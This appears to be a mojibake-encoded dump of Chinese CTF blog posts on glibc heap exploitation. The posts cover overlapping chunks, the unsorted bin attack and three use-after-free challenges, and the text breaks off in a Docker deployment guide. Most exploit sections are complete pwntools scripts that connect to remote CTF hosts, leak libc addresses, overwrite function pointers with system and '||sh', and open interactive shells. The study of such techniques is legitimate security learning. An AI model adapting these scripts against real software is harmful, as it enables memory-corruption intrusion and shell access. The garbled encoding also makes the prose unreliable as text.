â†’ æ”¹åˆ° p4â€ï¼Œå½¢æˆå¼ºåŠ›çš„è¶Šç•Œè¯»å†™èƒ½åŠ›ã€‚ å½“p2è¢«é‡Šæ”¾ä¹‹åï¼Œç”±äºå‰ä¸€ä¸ªç©ºé—²çš„ï¼Œæ‰€ä»¥p3çš„pre_sizeä½ä¼šè®°å½•å…¶å¤§å°0x100 1*(p2-1) = evil_chunk_size; ä¿®æ”¹ä¹‹åä¼šè¦†ç›–p3 1p4 = malloc(evil_region_size);#å°±ä¼šæŠŠp2è¿ç€p3ä¸€èµ·malloc æ­¤æ—¶å°±å¯ä»¥é€šè¿‡p3æˆ–p4å¤„ç†å¯¹æ–¹äº† pre_size changeé€šè¿‡æº¢å‡ºä¿®æ”¹ p2 çš„ size**ï¼Œéª—è¿‡ free(p2) çš„â€œå‘å‰&#x2F;å‘ååˆå¹¶ï¼ˆcoalesceï¼‰â€é€»è¾‘ï¼Œè®©åˆ†é…å™¨æŠŠp3 å½“æˆ p2 çš„ä¸€éƒ¨åˆ†è·³è¿‡å»ï¼Œç›´æ¥æŠŠ p2 ä¸æ›´è¿œå¤„å·²ç©ºé—²çš„ p4 åˆå¹¶æˆä¸€ä¸ªâ€œå¤§ç©ºé—²å—â€ã€‚éšåä¸€æ¬¡ malloc ä»è¿™ä¸ªâ€œå¤§å—â€é‡Œåˆ‡å‡º p6ï¼Œp6 çš„èŒƒå›´å°±ä¼šè¦†ç›–&#x2F;é‡å åˆ°åŸæœ¬åœ¨ç”¨çš„ p3ã€‚è¿™æ ·ä½ ç”¨ p6 çš„â€œåˆæ³•å†™â€å°±èƒ½æ”¹ p3 çš„æ•°æ® malloc_usable_sizeè¿”å›çš„æ˜¯sizeä¹‹åè¯¥å †å—å¯ä»¥å¡«å……å­—èŠ‚çš„æ•° 1234567891011121314151617181920 p1 = malloc(1000); p2 = malloc(1000); p3 = malloc(1000); p4 = malloc(1000); p5 = malloc(1000); real_size_p1 = malloc_usable_size(p1); real_size_p2 = malloc_usable_size(p2); real_size_p3 = malloc_usable_size(p3); real_size_p4 = malloc_usable_size(p4); real_size_p5 = malloc_usable_size(p5); free(p4); *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //&lt;--- BUG HERE #å‰ä¸€ä¸ªå †å—åœ¨ä½¿ç”¨ï¼Œp2æ²¡æœ‰pre_sizeä½ï¼Œæ‰€ä»¥p1çš„useä½ç½®ç›´æ¥åŠ p1çš„å¡«å……æ•°å°±åˆ°äº†ç¯‡çš„sizeä½ç½®#æŠŠp2çš„å¯å¡«å……ä½ç½®æ”¹ä¸ºè¦†ç›–p2å’Œp3,å³åŒ…å«p2å’Œp3çš„åŸå§‹å¡«å……èŒƒå›´å’Œä¸€ä¸ªå¤´sizeof(size_t) * 2ä»¥åŠprev_in_useè¡¨ç¤ºä¸Šä¸€ä¸ªåœ¨ä½¿ç”¨ä¸­ free(p2); p6 = malloc(2000); ä¸ºä»€ä¹ˆâ€œè¦å’Œ p4 åˆå¹¶â€æ‰ç¨³ free(p2) æ—¶ï¼Œåˆ†é…å™¨è®¡ç®— nextchunk = p2 + size(p2)ã€‚ ä½ æŠŠ size(p2)ä¼ªé€ æˆâ€œp2+p3 çš„æ€»å¤§å°â€ï¼Œäºæ˜¯ nextchunk åˆšå¥½æŒ‡åˆ° p4 çš„å¤´ã€‚ æ¥ç€å®ƒçœ‹ nextchunk æ˜¯å¦ç©ºé—²ï¼š è‹¥ p4 æ˜¯ç©ºé—² â†’ è§¦å‘å‰å‘åˆå¹¶ï¼šæŠŠ p2 å’Œ p4 æ‹¼æˆä¸€æ•´å—â€œå¤§ç©ºé—²å—â€ã€‚æ•´ä¸ªè¿‡ç¨‹ä¸ä¼šå»åŠ¨ p3 çš„å¤´ï¼Œå› æ­¤ä¸ä¼šè§¦å‘å¯¹ p3 çš„ä¸€è‡´æ€§æ£€æŸ¥ï¼Œç¨³ã€‚ è‹¥ p4 åœ¨ç”¨ â†’ ä¸åˆå¹¶ã€‚æ­¤æ—¶ä½ ä¼ªé€ çš„â€œè¶…å¤§ p2â€ä¼¸è¿›äº†æ­£åœ¨ä½¿ç”¨çš„ p3ï¼Œä½† free(p2) åˆä¸èƒ½å’Œ p3 åˆå¹¶ï¼Œä¸‹ä¸€æ­¥ allocator å¯èƒ½ä¼šåœ¨å¤„ç† nextchunk ç›¸å…³å­—æ®µæ—¶ï¼ˆæ¯”å¦‚å†™åˆå¹¶åçš„ prev_sizeã€æ£€æŸ¥ inuse ä½ç­‰ï¼‰æ’ä¸Šä¸ä¸€è‡´ï¼Œé«˜æ¦‚ç‡å´©ã€‚ æ¢å¥è¯è¯´ï¼šâ€œè·¨è¿‡ p3 å»æ‰¾ p4 å¹¶åˆå¹¶â€ï¼Œæ˜¯è¿™æ¡æ”»å‡»èƒ½åœ¨ free() çš„ä¸€è‡´æ€§æ£€æŸ¥ä¸‹å­˜æ´»çš„å…³é”®è®¾è®¡ã€‚ unsorted_binunsorted_binè°ƒé…æ­¥éª¤ 0 â€” malloc åˆ†é…ï¼ˆæœª free å‰ï¼‰ å‡è®¾ç¨‹åºåšäº† p = malloc(0x400)ï¼Œå¾—åˆ° p = 0x1000ã€‚å†…å­˜ï¼ˆç®€åŒ–ï¼‰ï¼š 12345åœ°å€ å†…å®¹ (8 bytes)0x0FF0: header.size (chunk headerï¼Œåœ¨ p ä¹‹å‰)0x1000: user[0] = ??? (p[0])0x1008: user[1] = ??? (p[1])0x1010: ... æ­¥éª¤ 1 â€” free(P) ï¼šæŠŠ P æ’å…¥ unsorted binï¼ˆglibc å†™å…¥ fd&#x2F;bkï¼‰ å½“ free(p) æ‰§è¡Œæ—¶ï¼ˆP æ˜¯å¤§å—ï¼Œèµ° unsorted è·¯å¾„ï¼‰glibc ä¼šæŠŠ P æ”¾å…¥ unsorted binï¼Œå¹¶åœ¨ user areaå¼€å¤´ å†™å…¥æŒ‡é’ˆï¼š 123å†™å…¥åŠ¨ä½œï¼ˆç”± free å®Œæˆï¼‰ï¼š *(p + 0) = fd = &amp;main_arena + off1 // å‡è®¾å…·ä½“å€¼ä¸º 0x2000 *(p + 1) = bk = &amp;main_arena + off2 // å‡è®¾å…·ä½“å€¼ä¸º 0x3000 å¯¹äºåˆšæ’å…¥ unsorted bin çš„ chunkï¼ˆbin ä¸ºç©ºæˆ–æ’å…¥åˆ° bin head æ—¶çš„å¸¸è§æƒ…å½¢ï¼‰ï¼Œglibc é€šå¸¸æŠŠ fd&#x2F;bk å†™æˆæŒ‡å‘ main_arenaï¼ˆæˆ– main_arena å†…æŸä¸ªå­—æ®µï¼‰çš„åœ°å€ â€”â€” ç®€å•è¯´å°±æ˜¯ æŒ‡å‘ libc å†…éƒ¨çš„æ•°æ®ç»“æ„çš„åœ°å€ï¼Œç°åœ¨è‹¥ç¨‹åºèƒ½è¯» p[0] æˆ– p[1]ï¼ˆä¾‹å¦‚æœ‰ infoleakã€printfã€readï¼‰ï¼Œå°±èƒ½å¾—åˆ°ä¸€ä¸ªè£¸ libc æŒ‡é’ˆ â€”â€” è¿™å°±æ˜¯å¸¸è§çš„ unsorted-bin æ³„éœ²ï¼Œç”¨æ¥è®¡ç®— libc åŸºå€ã€‚ å†…å­˜å¿«ç…§ï¼ˆfree åï¼‰ï¼š 123åœ°å€ å†…å®¹ï¼ˆå†™åï¼‰0x1000: 0x0000000000002000 // p[0] == fd0x1008: 0x0000000000003000 // p[1] == bk æ­¥éª¤ 2 â€” glibc æƒ³ç§»é™¤ Pï¼ˆmalloc è¯·æ±‚æˆ–æ•´ç†è¿‡ç¨‹è§¦å‘ unlinkï¼‰ å½“å¦ä¸€æ¬¡ malloc æˆ–æ•´ç†æµç¨‹éœ€è¦ç§»é™¤ unsorted bin ä¸­çš„ P æ—¶ï¼Œglibc ä¼šè¯»å– p[0]&#x2F;p[1]ï¼ˆfd &#x2F; bkï¼‰ï¼Œæ‰§è¡Œé“¾è¡¨æ›´æ–°ã€‚æ ¸å¿ƒä¼ªä»£ç ï¼š 123456fd = p[0]; // ä» 0x1000 è¯»å‡º 0x2000bk = p[1]; // ä» 0x1008 è¯»å‡º 0x3000// å†™æ“ä½œï¼šfd-&gt;bk = bk; // åœ¨ fd æŒ‡å‘åœ°å€ +8 å¤„å†™å…¥ bkbk-&gt;fd = fd; // åœ¨ bk æŒ‡å‘åœ°å€ +0 å¤„å†™å…¥ fd æŠŠæ•°å€¼ä»£å…¥ï¼šfd = 0x2000, bk = 0x3000ã€‚ å†™æ“ä½œ A (fd-&gt;bk = bk) å¯¹åº”å†…å­˜å†™ *(0x2000 + 8) = 0x3000ï¼Œå³å†™å…¥åœ°å€ 0x2008ã€‚ å†™æ“ä½œ B (bk-&gt;fd = fd) å¯¹åº”å†…å­˜å†™ *(0x3000 + 0) = 0x2000ï¼Œå³å†™å…¥åœ°å€ 0x3000ã€‚ ï¼ˆå°±æ˜¯è¯´æŠŠè¿™ä¸ªå•ç‹¬æ‘˜å‡ºå»ï¼Œå†é€šè¿‡å…¶å®ƒçš„æŠŠé“¾è¡¨æ¥ä¸Šï¼‰ unsorted_binæ”»å‡»é€šè¿‡ä¿®æ”¹bkæŒ‡é’ˆè°ƒå–æ ˆä¸Šçš„ä¼ªé€ å † 12345678910111213141516 intptr_t* victim = malloc(0x100); intptr_t* p1 = malloc(0x100);//é˜²åˆå¹¶ free(victim);//ä¼ªé€ å † stack_buffer[1] = 0x100 + 0x10; stack_buffer[3] = (intptr_t)stack_buffer;//ä¿®æ”¹unsortedä¸­çš„chunkï¼Œè¿æ¥ä¸‹ä¸€ä¸ªchunk victim[-1] = 32;// ä¿®æ”¹ victim-&gt;size ä¸º 0x20,è®©mallocè·³è¿‡è¿™ä¸ªå † victim[1] = (intptr_t)stack_buffer; // ä¿®æ”¹ victim-&gt;bk æŒ‡å‘æ ˆä¸Šçš„ä¼ªé€  chunk char *p2 = malloc(0x100); printf(&quot;malloc(0x100): %p\\n&quot;, p2); intptr_t sc = (intptr_t)jackpot; //shellcode memcpy((p2+40), &amp;sc, 8); //é€šè¿‡æ ˆä¸Šçš„retå»è·å–shell 12victim[-1] = 32;// ä¿®æ”¹ victim-&gt;size ä¸º 0x20,è®©mallocè·³è¿‡è¿™ä¸ªå †victim[1] = (intptr_t)stack_buffer; // ä¿®æ”¹ victim-&gt;bk æŒ‡å‘æ ˆä¸Šçš„ä¼ªé€  chunk æ”¹ä¹‹å å®æ“ä¾‹é¢˜ add free ï¼ˆæŒ‡é’ˆç½®0äº†ï¼Œæ²¡æœ‰uafæ¼æ´ï¼‰ exit (å¯ä»¥è‡ªå·±æ§åˆ¶è¾“å…¥ï¼Œå¯ä»¥å †æº¢å‡º) è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839from pwn import* #r = process(&#x27;./magic&#x27;)r =remote(&quot;node5.buuoj.cn&quot;,27415)#gdb.attach(r,&quot;b malloc&quot;)def create(size,content): r.sendlineafter(&#x27;Your choice :&#x27;,&#x27;1&#x27;) r.sendlineafter(&#x27;Size of Heap :&#x27;,str(size)) r.sendlineafter(&#x27;Content of heap:&#x27;,content) def edit(idx,size,content): r.sendlineafter(&#x27;Your choice :&#x27;,&#x27;2&#x27;) r.sendlineafter(&#x27;Index :&#x27;,str(idx)) r.sendlineafter(&#x27;Size of Heap :&#x27;,str(size)) r.sendlineafter(&#x27;Content of heap :&#x27;,content) def delete(idx): r.sendlineafter(&#x27;Your choice :&#x27;,&#x27;3&#x27;) r.sendlineafter(&#x27;Index :&#x27;,str(idx)) create(0x30,&#x27;aaaa&#x27;)create(0x80,&#x27;bbbb&#x27;)create(0x10,&#x27;cccc&#x27;)delete(1) magic= 0x06020A0 pay=0x30 * b&quot;a&quot; + p64(0)+p64(0x91)+p64(0)+p64(magic-0x10)edit(0,0x50,pay)create(0x80,&#x27;dddd&#x27;)# gdb.attach(r)# pause()r.sendlineafter(&#x27;Your choice :&#x27;,&#x27;4869&#x27;)r.interactive()","categories":[{"name":"heap_study","slug":"heap-study","permalink":"http://example.com/categories/heap-study/"}],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"UAFæ¼æ´åˆæ¢","slug":"UAFæ¼æ´åˆæ¢","date":"2025-09-28T06:42:18.000Z","updated":"2025-10-21T12:58:37.115Z","comments":true,"path":"2025/09/28/UAFæ¼æ´åˆæ¢/","permalink":"http://example.com/2025/09/28/UAF%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/","excerpt":"","text":"UAF,å…¨ç§°use after free,å³åœ¨é‡Šæ”¾ä¹‹åä½¿ç”¨ é‚£ä¹ˆå…·ä½“åˆä»£è¡¨äº†ä»€ä¹ˆå‘¢? æˆ‘ä»¬é¦–å…ˆè¦çŸ¥é“çš„æ˜¯,æˆ‘ä»¬freeé€‚å½“å¤§å°çš„chunkæ—¶,æˆ‘ä»¬freeæ‰çš„chunkä¼šå…ˆè¢«æ”¾å…¥bins, åœ¨æˆ‘ä»¬å†æ¬¡ç”³è¯·é€‚åˆå¤§å°çš„chunkæ—¶ç³»ç»Ÿä¼šä¼˜å…ˆä»æˆ‘ä»¬binsä¸­å–å‡ºä¹‹å‰freeæ‰çš„chunkè¿”å›ç»™æˆ‘ä»¬ é‚£ä¹ˆæ­¤æ—¶ä¼šæœ‰ä¸¤ç§æƒ…å†µ Freeåç©ºé—´ç½®0 Freeåç©ºé—´ä¸ç½®0 uaf1-æœ‰åé—¨ add å¯ä»¥çœ‹åˆ°åœ¨æ”¾ç½®åå­—ä¹‹å‰ä¼šæœ‰ä¸€ä¸ªç®¡ç†å †å—ç”¨äºå‚¨å­˜åå­—åœ°å€ delete æŠŠåå­—å †å—å’Œç®¡ç†å †å—ä¸€èµ·freeï¼Œä½†æ˜¯æ²¡æ”¹å˜æŒ‡é’ˆ show è°ƒç”¨å­˜æ”¾åœ¨ç®¡ç†å †å—é‡Œçš„å‡½æ•° æ€è·¯ å…ˆaddä¸¤ä¸ªå †å—ï¼Œç„¶åfreeæ‰ï¼Œè®©ä¸¤ä¸ªç®¡ç†å †å—å›åˆ°fast_binä¸­ ä¹‹åå†addä¸€ä¸ªå’Œç®¡ç†å †å—ä¸€æ ·å¤§å°çš„å †å—ï¼Œfast_binæ˜¯å…ˆè¿›åå‡º æ‰€ä»¥ç®¡ç†å †å—1ä¼šå…ˆè¢«å–å‡ºä½œä¸ºç®¡ç†å †å—ï¼Œç„¶åç®¡ç†å †å—0ä¼šè¢«å†™å…¥æˆ‘ä»¬çš„åå­—ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒèµ‹å€¼ä¸ºåé—¨å‡½æ•°çš„åœ°å€ï¼Œç„¶åæ‰§è¡Œå †å—0 è„šæœ¬12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./uaf1&quot;remote_host = &quot;node4.anna.nssctf.cn&quot;remote_port = 28483context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) gdb.attach(p, &quot;b* &quot;)def sla(a, b): p.sendlineafter(a, b)def ru(a): p.recvuntil(a)def sa(a, b): p.sendafter(a, b)def pr(a,b): print(a+b&quot;=========================&quot;+hex(b).encode())def choice(idx) : p.sendafter(&quot;Your choice :&quot;, str(idx))def add(size, content) : choice(1) p.sendafter(&quot;Her name size is :&quot;, str(size)) p.sendafter(&quot;Her name is :&quot;, content)def free(idx) : choice(2) p.sendafter(&quot;Index :&quot;, str(idx))def show(idx) : choice(3) p.sendafter(&quot;Index :&quot;, str(idx))bin=0x400b9cadd(0x60,b&quot;1&quot;*0x60)add(0x60,b&quot;a&quot;*0x60)free(0)free(1)add(0x10,p64(bin))#pause()show(0)p.interactive() uaf2-æ³„éœ²libc add ä¼šæŠŠputså‡½æ•°æ”¾åœ¨ç®¡ç†å—çš„ç¬¬ä¸€ä¸ªuserå— show æ‰§è¡Œçš„å‡½æ•°æ˜¯*ptr[i]ï¼Œå‚æ•°æ˜¯ptr[i] åœ¨æ²¡æœ‰ä¿®æ”¹çš„æ—¶å€™ï¼Œåªæ‰§è¡Œputså‡½æ•°ï¼Œå‚æ•°ä¸º*(a1+4),ä¹Ÿå°±æ˜¯æˆ‘ä»¬è‡ªå·±çš„å †å—çš„userå¤„ æ²¡æœ‰åé—¨å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥æŠŠlibcåœ°å€æ”¾è¿›å»ï¼Œé€šè¿‡putså‡½æ•°å»æ³„éœ²libcåŸºå€ï¼Œåœ¨å †ä¸Šæ”¾ç½®ä½ çš„æ‰§è¡Œå‡½æ•°å’Œå‚æ•°ï¼Œæœ€åå»showè¿™ä¸ªè¢«æ”¹å˜çš„å †å— æ”»å‡»æ€è·¯çœ‹åˆ°æœ‰0x8çš„ç®¡ç†å †å— æ‰€ä»¥å…ˆaddä¸¤ä¸ªä¸åŒå¤§å°çš„å †å—å¹¶é‡Šæ”¾æ‰ï¼Œå†addä¸€ä¸ª0x8å¤§å°çš„å †å—ï¼Œé‚£ä¹ˆptræŒ‡é’ˆæŒ‡å‘çš„ä¸¤ä¸ªç®¡ç†å †å—ï¼Œå°±ä¼šè¢«åˆ©ç”¨ï¼ˆæ­¤æ—¶å¯ä»¥é€šè¿‡æˆ‘ä»¬æ“ä½œçš„è¿™ä¸ªå †å—0å°±å¯¹åº”çš„ptr[0]çš„ç®¡ç†å †å—ï¼Œä¹Ÿå°±æ˜¯è“è‰²å †å—ï¼‰ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥å‘å®ƒé‡Œå†™å…¥æˆ‘ä»¬è¦æ‰§è¡Œçš„å‡½æ•°ï¼ˆåŸæ¥çš„ç®¡ç†å †å—çš„åŸä½ç½®putså‡½æ•°ä½ç½®ï¼‰å’Œå‚æ•°ï¼ˆä¸€ä¸ªgotè¡¨åœ°å€ï¼‰ 123456789101112131415add(0x20, b&#x27;a&#x27; * 8) add(0x20, b&#x27;b&#x27; * 8) free(0)free(1)puts=0x804862Bputs_got = elf.got[&#x27;puts&#x27;]add(0x8,p32(puts)+p32(puts_got))show(0)puts=u32(p.recv(4))print(hex(puts))libc_base =puts- libc.symbols[&#x27;puts&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;] ä¹‹åæŠŠé‚£ä¸¤ä¸ª0x10çš„å †å—freeæ‰ï¼Œç„¶åå†addå»æŠŠsystemæ”¾è¿›å» æ³„éœ²å‡ºlibcåŸºå€ä¹‹åå°±å¯ä»¥ä¼ªé€ ç®¡ç†å †å—å¹¶æ”¾ç½®æˆ‘ä»¬çš„systemä»¥åŠå‚æ•°äº† ç”±äºè¿™ä¸ªå‡½æ•°çš„å‚æ•°æ˜¯è¯¥å †å—çš„userå†…å®¹ï¼Œæ‰€ä»¥payloadè¦ä¼ é€’p32(system_addr)+bâ€||shâ€ è¿™å°±ç›¸å½“äºsystem(XXXX||sh)å…ˆæ‰§è¡Œystem(XXXX),ä¸æˆåŠŸä¹‹åå†æ‰§è¡Œsystem(sh) linuxçš„å¸¸è¯† &amp;&amp;ï¼šç”¨æ¥æ‰§è¡Œæ¡ä»¶æˆç«‹åæ‰§è¡Œçš„å‘½ä»¤||ï¼šç”¨æ¥æ‰§è¡Œæ¡ä»¶ä¸æˆç«‹åçš„æ‰§è¡Œå‘½ä»¤ 123free(2)add(0x8, p32(system_addr)+b&quot;||sh&quot;)show(0) è„šæœ¬123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *import sysfrom LibcSearcher import *p= process(&quot;./uaf2&quot;)#p=remote(&quot;61.147.171.103&quot;,64362)filename = &quot;./uaf2&quot;elf = ELF(filename)context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#libc=ELF(&#x27;./libc_32.so.6&#x27;)libc=elf.libcdef sla(a, b): p.sendlineafter(a, b)def ru(a): p.recvuntil(a)def sa(a, b): p.sendafter(a, b)def debug(): gdb.attach(p) pause()def choice(idx) : p.sendafter(&quot;Your choice :&quot;, str(idx))def add(size, content) : choice(1) p.sendafter(&quot;Note size :&quot;, str(size)) p.sendafter(&quot;Content :&quot;, content)def free(idx) : choice(2) p.sendafter(&quot;Index :&quot;, str(idx))def show(idx) : choice(3) p.sendafter(&quot;Index :&quot;, str(idx))add(0x20, b&#x27;a&#x27; * 8) add(0x20, b&#x27;b&#x27; * 8) free(0)free(1)puts=0x804862Bputs_got = elf.got[&#x27;puts&#x27;]add(0x8,p32(puts)+p32(puts_got))show(0)puts=u32(p.recv(4))print(hex(puts))libc_base =puts- libc.symbols[&#x27;puts&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]free(2)add(0x8, p32(system_addr)+b&quot;||sh&quot;)# gdb.attach(p)# pause()show(0)p.interactive() uaf3-ä¿®æ”¹æ ˆä¸Šçš„æ•°æ®é™åˆ¶mallocä¸ºfastbin uaf exit ç›´æ¥ä¿®æ”¹è¯¥æ‰€é€‰æ‹©å †å—çš„userçš„ç¬¬ä¸€ä¸ªå—å¤„ï¼Œä¸”åªèƒ½ä¿®æ”¹8å­—èŠ‚ æœ‰åé—¨å‡½æ•° æŠŠ1æ”¹ä¸º0å°±å¯ä»¥æ‰§è¡Œåé—¨å‡½æ•° æ”»å‡»æ€è·¯åœ¨1é™„è¿‘ä¼ªé€ ä¸€ä¸ªå †å—ï¼Œä¸”çœ‹åˆ°äº†é‚£ä¸ª0x50ï¼Œæ‰€ä»¥åº”xè¯¥åœ¨0x602080å¤„ä¼ªé€ 0x40å¤§å°çš„å †ï¼Œè®©é‚£ä¸ª0x50ä½œä¸ºsizeä½ï¼Œé‚£ä¹ˆæ­¤æ—¶è¿™ä¸ªå †å—çš„userä½å°±æ˜¯æˆ‘ä»¬çš„è¦æ”¹å˜çš„ä½ç½® é€šè¿‡ä¿®æ”¹fast_binçš„fdæŒ‡é’ˆè®©ä¸‹ä¸€ä¸ªå †å—åœ¨æŒ‡å®šå¤„mallocå‡ºæ¥ è„šæœ¬12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from __future__ import print_functionfrom pwn import *binary = &#x27;./uaf3&#x27; #binary&#x27;s name herecontext.binary = binary #context herecontext.log_level=&#x27;debug&#x27;pty = process.PTYp = process(binary, aslr = 1, stdin=pty, stdout=pty) #process option hereHost =&#x27;101.43.200.131&#x27;Port =32828p = remote(Host,Port)elf = ELF(binary)libc = elf.libcmy_u64 = lambda x: u64(x.ljust(8, &#x27;\\x00&#x27;))my_u32 = lambda x: u32(x.ljust(4, &#x27;\\x00&#x27;))global_max_fast=0x3c67f8def loginfo(what=&#x27;&#x27;,address=0): log.info(&quot;\\033[1;36m&quot; + what + &#x27;-----&gt;&#x27; + hex(address) + &quot;\\033[0m&quot;)# todo heredef Alloc(size): p.recvuntil(&quot;choice&gt;\\n&quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;size&gt;\\n&quot;) p.sendline(str(size))def Free(index): p.recvuntil(&quot;choice&gt;\\n&quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;index&gt;\\n&quot;) p.sendline(str(index))def Modify(index,content): p.recvuntil(&quot;choice&gt;\\n&quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;index&gt;\\n&quot;) p.sendline(str(index)) p.send(content)Alloc(0x40)Free(0)Modify(0,p64(0x602080))Alloc(0X40)Alloc(0X40)Modify(2,&#x27;\\x00&#x27;)p.recvuntil(&quot;choice&gt;\\n&quot;)p.sendline(&quot;4&quot;)p.interactive()","categories":[{"name":"heap_study","slug":"heap-study","permalink":"http://example.com/categories/heap-study/"}],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"},{"name":"UAF","slug":"UAF","permalink":"http://example.com/tags/UAF/"}]},{"title":"pwn_dockeré¢˜ç›®éƒ¨ç½²","slug":"pwn-dockeré¢˜ç›®éƒ¨ç½²","date":"2025-09-23T06:32:22.000Z","updated":"2025-09-23T08:35:51.612Z","comments":true,"path":"2025/09/23/pwn-dockeré¢˜ç›®éƒ¨ç½²/","permalink":"http://example.com/2025/09/23/pwn-docker%E9%A2%98%E7%9B%AE%E9%83%A8%E7%BD%B2/","excerpt":"","text":"dockerDocker æ˜¯ä¸€ä¸ª å®¹å™¨åŒ–å·¥å…·ã€‚ åœ¨ä¸åŒçš„ç¯å¢ƒä¸‹ï¼Œç¨‹åºå¯èƒ½å› ä¸ºå¤„äºä¸åŒçš„ç¯å¢ƒæ— æ³•æ­£å¸¸è¿è¡Œï¼Œ dockerèƒ½æŠŠ ç¨‹åº + ä¾èµ–ç¯å¢ƒ ä¸€èµ·æ‰“åŒ…æˆä¸€ä¸ªæ ‡å‡†çš„â€œç›’å­â€ï¼ˆé•œåƒï¼‰ï¼Œç„¶ååœ¨ä»»ä½•åœ°æ–¹éƒ½èƒ½è¿è¡Œï¼ˆå®¹å™¨ï¼‰ï¼Œå®¹å™¨å°±æ˜¯é•œåƒçš„åŠ¨æ€å®ä¾‹. ç»„æˆéƒ¨åˆ†dockerä¸»è¦æœ‰å››éƒ¨åˆ†ï¼š é•œåƒ (Image) ç›¸å½“äºä¸€ä¸ªâ€œå®‰è£…åŒ…â€æˆ–è€…â€œæ¨¡ç‰ˆâ€ã€‚é‡Œé¢å†™æ˜äº†æ“ä½œç³»ç»Ÿã€ä¾èµ–åº“ã€ç¨‹åºæ–‡ä»¶ã€‚ å®¹å™¨ (Container) é•œåƒè¿è¡Œåçš„å®ä¾‹ï¼Œå°±åƒâ€œå®‰è£…åŒ…â€å®‰è£…å‡ºæ¥å¹¶è¿è¡Œçš„ç¨‹åºã€‚å®¹å™¨æ˜¯æ´»çš„ï¼Œå¯ä»¥æ”¹åŠ¨ã€è¿è¡Œã€åœæ­¢ã€åˆ é™¤ã€‚ Dockerfile å°±æ˜¯ä¸€ä»½â€œè¯´æ˜ä¹¦â€ï¼Œå†™æ¸…æ¥šé•œåƒæ€ä¹ˆåˆ¶ä½œã€‚ ä»“åº“ (Registry) å­˜æ”¾é•œåƒçš„åœ°æ–¹ï¼Œæ¯”å¦‚ï¼š Docker Hubï¼ˆå…¬å…±ä»“åº“ï¼‰ é˜¿é‡Œäº‘å®¹å™¨é•œåƒæœåŠ¡ åŸºç¡€æ“ä½œ1.æŸ¥çœ‹æœ¬åœ°é•œåƒ 1docker images 2.æ„é€ é•œåƒ ç”Ÿæˆä¸€ä¸ªé•œåƒ (Image)ï¼Œå­˜åœ¨äºæœ¬åœ°çš„ Docker é•œåƒåº“é‡Œã€‚ 1docker build -t &lt;é•œåƒå[:tag]&gt; ï¼ˆæ„å»ºä¸Šä¸‹æ–‡ç›®å½•ï¼‰ 3.ä¸Šä¼ é•œåƒ 1docker push &lt;IMAGE&gt;ï¼ˆ[&lt;ä»“åº“å&gt;/]&lt;å‘½åç©ºé—´&gt;/&lt;REPO&gt;:&lt;TAG&gt;ï¼‰ 4.æŸ¥çœ‹æœ¬åœ°é•œåƒ 1docker images 5.åˆ é™¤é•œåƒ 1docker rmi -&lt;ç‰ˆæœ¬å·&gt; pwnéƒ¨ç½²é¦–å…ˆè¦åˆ›å»ºè‡ªå·±çš„é˜¿é‡Œäº‘ è¿™äº›æ“ä½œå¥½ä¹‹ååœ¨è™šæ‹Ÿæœºä¸­æ‰§è¡Œä»¥ç™»å½•è‡ªå·±çš„é˜¿é‡Œäº‘è´¦å·ï¼ˆä¸€èˆ¬ç™»é™†ä¸€æ¬¡ä¹‹åä¼šä¸€ç›´ä¿æŒç™»å½•çŠ¶æ€ï¼‰ é…ç½®ä»£ç†1.å¼€å¯å°çŒ«çš„Allow LAN (å…è®¸å±€åŸŸç½‘è¿æ¥) é»˜è®¤æƒ…å†µä¸‹ï¼ŒClash åªç›‘å¬ æœ¬æœºå›ç¯åœ°å€ï¼ˆ127.0.0.1:7890ï¼‰ï¼Œåªæœ‰ Windows è‡ªå·±èƒ½ç”¨ä»£ç†ã€‚å‹¾é€‰äº† Allow LANï¼ŒClash ä¼šç›‘å¬ 0.0.0.0:7890ï¼Œä¹Ÿå°±æ˜¯å…è®¸ å±€åŸŸç½‘å†…å…¶ä»–è®¾å¤‡ï¼ˆè™šæ‹Ÿæœºã€Docker å®¹å™¨ã€æ‰‹æœºç­‰ï¼‰é€šè¿‡ä½ çš„ç”µè„‘çš„ IP åœ°å€æ¥ä½¿ç”¨ä»£ç† 2.ç„¶åå»æŸ¥çœ‹Windows å®¿ä¸»æœºä¸Šçš„è™šæ‹Ÿç½‘å¡ 1ipconfig.exe 3.æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ï¼Œå†™å…¥ 1sudo vim /usr/bin/dockerproxy 4.æ”¹å®¿ä¸»æœºipå’Œç«¯å£è¾“å…¥ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#!/bin/bash# Docker ä»£ç†ç®¡ç†è„šæœ¬# ä½¿ç”¨æ–¹æ³•: sudo ./docker-proxy.sh [set|unset] [proxy_address]set -e# é»˜è®¤ä»£ç†åœ°å€DEFAULT_PROXY=&quot;ç½‘å¡:7890&quot;PROXY_DIR=&quot;/etc/systemd/system/docker.service.d&quot;PROXY_CONF=&quot;$PROXY_DIR/http-proxy.conf&quot;# æ˜¾ç¤ºä½¿ç”¨è¯´æ˜usage() &#123; echo &quot;ä½¿ç”¨æ–¹æ³•: $0 [set|unset] [proxy_address]&quot; echo &quot; set [proxy_address] - è®¾ç½® Docker ä»£ç† 